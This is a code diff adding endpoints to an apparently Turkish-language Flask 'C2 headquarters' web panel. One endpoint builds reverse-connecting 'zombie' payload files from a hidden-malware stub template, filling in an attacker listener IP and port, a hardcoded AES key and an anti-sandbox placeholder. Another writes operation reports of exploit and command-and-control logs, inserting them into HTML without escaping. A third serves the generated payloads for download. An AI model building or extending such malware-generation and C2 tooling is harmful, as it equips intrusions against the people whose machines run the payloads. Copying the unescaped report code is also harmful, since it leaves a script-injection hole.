@@ -178,6 +178,90 @@ def run_module_api():
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)})
 
+@app.route("/api/generate_payload", methods=["POST"])
+def generate_payload():
+    data = request.json
+    lhost = data.get("lhost")
+    lport = data.get("lport", "443")
+    
+    if not lhost:
+        return jsonify({"status": "error", "message": "LHOST (Dinleyici IP) zorunludur."})
+        
+    template_path = os.path.join(base_d, "Moduller", "11_Gizli_Zararli_Olusturucu", "stub_template.py")
+    if not os.path.exists(template_path):
+        return jsonify({"status": "error", "message": "Taslak zararli bulunamadi."})
+        
+    payloads_dir = os.path.join(base_d, "payloads")
+    os.makedirs(payloads_dir, exist_ok=True)
+    out_name = f"zombi_{lhost.replace('.', '_')}_{lport}.py"
+    out_file = os.path.join(payloads_dir, out_name)
+    
+    try:
+        with open(template_path, "r", encoding="utf-8") as f:
+            content = f.read()
+            
+        content = content.replace("__LHOST__", lhost)
+        content = content.replace("__LPORT__", str(lport))
+        content = content.replace("__AES_KEY__", "ThisIsASecretKey1234567890123456")
+        content = content.replace("__ANTI_SB__", "time.sleep(1) # Fake delay")
+        
+        with open(out_file, "w", encoding="utf-8") as f:
+            f.write(content)
+            
+        return jsonify({"status": "success", "message": f"Zararli yazilim uretildi: {out_name}", "download_url": f"/download/payload/{out_name}"})
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)})
+
+@app.route("/api/generate_report", methods=["POST"])
+def generate_report():
+    data = request.json
+    history = data.get("history", "Log bulunamadi.")
+    
+    reports_dir = os.path.join(base_d, "reports")
+    os.makedirs(reports_dir, exist_ok=True)
+    import datetime
+    out_name = f"pentest_raporu_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
+    out_file = os.path.join(reports_dir, out_name)
+    
+    html_content = f\"\"\"
+    <html>
+    <head>
+        <title>Sizma Testi Operasyon Raporu</title>
+        <style>
+            body {{ font-family: Arial, sans-serif; background-color: #f4f4f4; color: #333; margin: 0; padding: 20px; }}
+            .container {{ max-width: 900px; margin: auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }}
+            h1 {{ color: #b30000; border-bottom: 2px solid #b30000; padding-bottom: 10px; }}
+            .log-box {{ background: #1e1e1e; color: #00ff00; font-family: monospace; padding: 15px; border-radius: 5px; white-space: pre-wrap; overflow-x: auto; max-height: 600px; }}
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>C2 Karargahı Operasyon Raporu</h1>
+            <p><strong>Tarih:</strong> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
+            <p><strong>Operasyon Özeti:</strong> Aşagida sistem üzerinden gerçekleştirilen zafiyet tarama, komuta kontrol ve exploit islemlerinin tam log dökümü bulunmaktadir.</p>
+            <h3>Terminal Loglari:</h3>
+            <div class="log-box">{history}</div>
+        </div>
+    </body>
+    </html>
+    \"\"\"
+    
+    try:
+        with open(out_file, "w", encoding="utf-8") as f:
+            f.write(html_content)
+        return jsonify({"status": "success", "message": f"Rapor hazir: {out_name}", "download_url": f"/download/report/{out_name}"})
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)})
+
+@app.route("/download/<type>/<path:filename>")
+def download_file(type, filename):
+    from flask import send_from_directory
+    if type == "payload":
+        return send_from_directory(os.path.join(base_d, "payloads"), filename, as_attachment=True)
+    elif type == "report":
+        return send_from_directory(os.path.join(base_d, "reports"), filename, as_attachment=True)
+    return "Not found", 404
+
 if __name__ == "__main__":
     os.makedirs(os.path.join(base_d, "Ganimetler"), exist_ok=True)
     print("🚀 Web Karargahı Başlatılıyor... http://127.0.0.1:5000 adresine gidin.")
